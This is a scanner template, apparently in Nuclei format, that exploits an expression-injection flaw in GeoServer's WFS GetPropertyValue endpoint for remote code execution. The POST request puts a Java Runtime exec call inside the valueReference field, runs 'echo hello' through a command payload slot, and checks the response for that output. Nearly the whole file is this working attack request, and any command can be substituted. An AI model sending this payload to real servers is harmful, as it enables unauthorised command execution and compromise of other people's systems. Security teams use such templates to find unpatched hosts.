id: geoserver-exploit
info:
  author: zero
  description: This template exploits a vulnerability in GeoServer to achieve remote
    code execution (RCE).
  name: GeoServer Exploit
  severity: high
requests:
- attack: clusterbomb
  matchers:
  - status:
    - 400
    type: status
  - type: word
    words:
    - hello
  matchers-condition: and
  payloads:
    command:
    - echo hello
    object_type:
    - ReplaceWithFeatureType
  raw:
  - 'POST /geoserver/wfs HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Accept: */*

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

    Connection: close

    Content-Type: application/xml


    <wfs:GetPropertyValue service=''WFS'' version=''2.0.0''

    xmlns:topp=''http://www.openplans.org/topp''

    xmlns:fes=''http://www.opengis.net/fes/2.0''

    xmlns:wfs=''http://www.opengis.net/wfs/2.0''>

    <wfs:Query typeNames=''{{object_type}}''/>

    <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{{command}}")</wfs:valueReference>

    </wfs:GetPropertyValue>

    '
